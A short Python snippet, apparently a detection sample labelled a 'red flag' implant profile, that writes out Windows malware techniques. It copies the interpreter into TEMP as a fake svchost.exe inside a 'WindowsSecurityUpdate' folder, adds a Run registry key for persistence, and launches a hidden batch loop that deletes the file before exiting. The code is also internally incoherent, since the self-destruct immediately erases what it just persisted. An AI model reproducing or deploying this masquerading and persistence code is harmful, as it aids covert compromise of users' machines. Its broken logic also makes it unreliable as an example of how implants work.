# Real implant profile: persistence + self-destruct together = red flag
import os, shutil, subprocess, sys, tempfile
from pathlib import Path

def install_and_arm():
    # Persistence
    tmp = Path(os.environ["TEMP"]) / "WindowsSecurityUpdate"
    tmp.mkdir(exist_ok=True)
    dest = tmp / "svchost.exe"
    shutil.copy2(sys.executable, dest)

    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, str(dest))

    # Self-destruct on detection
    bat = os.path.join(tempfile.gettempdir(), "sd.bat")
    with open(bat, "w") as f:
        f.write(f'@echo off\n:loop\ndel "{dest}" >nul 2>&1\nif exist "{dest}" goto loop\n')
    subprocess.Popen(["cmd", "/c", bat], creationflags=subprocess.CREATE_NO_WINDOW)
    os._exit(0)